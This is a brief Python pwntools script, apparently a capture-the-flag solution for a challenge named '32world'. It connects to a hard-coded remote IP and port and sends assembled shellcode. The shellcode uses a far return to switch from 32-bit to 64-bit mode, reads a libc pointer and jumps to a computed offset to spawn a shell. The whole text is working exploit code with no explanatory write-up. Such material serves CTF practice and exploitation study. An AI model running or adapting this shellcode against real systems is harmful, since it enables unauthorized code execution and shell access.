from pwn import *

#p = process('./32world')
p = remote('54.65.133.244', 8361)

p.recvuntil('code :')

# dec eax => REX prefix in 64-bit
code = '''
push 0x33
call A
.byte 0x64, 0x48, 0x8b, 0x00
dec eax
mov eax, [eax - 0x58]
dec eax
sub eax, 0x176ce0 - 0x4526a
jmp eax

A:
retf
'''

payload = asm(code, arch='i386')
print disasm(payload, arch='amd64')

pause()

p.sendline(payload)

p.interactive()
